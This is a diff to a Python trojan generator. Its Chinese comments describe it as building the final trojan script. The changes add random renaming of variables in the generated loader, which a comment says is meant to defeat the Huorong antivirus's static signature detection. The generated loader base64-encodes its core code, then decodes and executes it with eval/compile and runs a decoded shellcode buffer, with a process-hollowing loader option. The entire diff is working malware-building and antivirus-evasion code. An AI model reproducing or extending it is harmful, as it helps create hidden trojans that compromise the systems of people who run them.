@@ -56,6 +56,15 @@ class Creater():
         self.modoleName=cmdcoder.getModulName(self.loaderType,self.encType)
 
 
+    def RandomStr(self,cmd='',text=''):
+        ramdbuf=''.join(random.sample(string.ascii_letters,random.randrange(5,10)))
+        randcmd=''.join(random.sample(string.ascii_letters,random.randrange(5,10)))
+        randhhhhhhhhhhhhhh=''.join(random.sample(string.ascii_letters,random.randrange(5,10)))
+
+        cmd=cmd.replace('bbbbbbbb',ramdbuf).replace('aaaaaaaa',randcmd).replace('hhhhhhhhhhhhhh',randhhhhhhhhhhhhhh)
+        text=text.replace('bbbbbbbb',ramdbuf).replace('aaaaaaaa',randcmd).replace('hhhhhhhhhhhhhh',randhhhhhhhhhhhhhh)
+
+        return cmd,text
 
     def CreateTrojan(self):
         #生成最终运行的木马脚本
@@ -64,15 +73,15 @@ class Creater():
         cmd=f'{self.shellcode}\n' \
             f'{self.deccode}\n'
 
-        cmd+=f'cmd={self.cmdcode}\n' if self.encType else self.cmdcode
+        cmd+=f'aaaaaaaa ={self.cmdcode}\n' if self.encType else self.cmdcode
 
-        cmd+=f'key=random.randint(0,100)\n' \
-             f'buf=Decode(buf,False,key)\n' \
-             f'cmd=Decode(cmd,True,key)\n' if self.encType else ''
+        cmd+=f'key =random.randint(0,100)\n' \
+             f'bbbbbbbb =Decode(bbbbbbbb ,False,key )\n' \
+             f'aaaaaaaa =Decode(aaaaaaaa ,True,key)\n' if self.encType else ''
 
-        # print(f'构造出的cmd：{cmd}\n'+'-'*80)
-        #1.将上面构造出的核心代码做一次base64编码。
-        cmd=base64.b64encode(cmd.encode())
+
+
+
 
         #2.构造最终的木马脚本：从self.importP获取需要import的包
         text=''
@@ -81,9 +90,20 @@ class Creater():
         text+=f'{"" if self.is_urlWriteIn else "url=sys.argv[1]"}\n' \
               f'for i in range(10000):\n' \
               f'    try:\n' \
-              f'        eval(compile(base64.b64decode({cmd}.decode()).decode(),"asd","exec"))'
+              f'        eval(compile(base64.b64decode(qqqqqqqqq.decode()).decode(),"hhhhhhhhhhhhhh","exec"))'
 
-        text+=f'\n        eval(compile(cmd,"asd","exec"))\n        main(buf)\n        {"break" if self.loaderType=="ProcessHollowing.py" else ""}\n    except FileNotFoundError:print("请将每次重新生成的PayloadFile文件放在本目录");time.sleep(3);break\n    except:pass'
+        text+=f'\n        eval(compile(aaaaaaaa ,"hhhhhhhhhhhhhh","exec"))\n        main(bbbbbbbb)\n        {"break" if self.loaderType=="ProcessHollowing.py" else ""}\n    except FileNotFoundError:print("请将每次重新生成的PayloadFile文件放在本目录");time.sleep(3);break\n    except:pass'
+
+
+        #给构造出的代码变量增加一些随机性，火绒会拿变量名来做静态特征查杀。。。
+        cmd,text=self.RandomStr(cmd,text)
+
+
+        #1.将上面构造出的核心代码做一次base64编码。
+        cmd=base64.b64encode(cmd.encode())
+
+        #将加密后的cmd替换到最终代码上
+        text=text.replace('qqqqqqqqq',f'{cmd}')
 
         #print("{self.modeInfo}秘钥碰撞失败，如果多次运行程序还是失败，请确认已经将最新生成的PayloadFile放在本目录下（每次都会变化）")
 
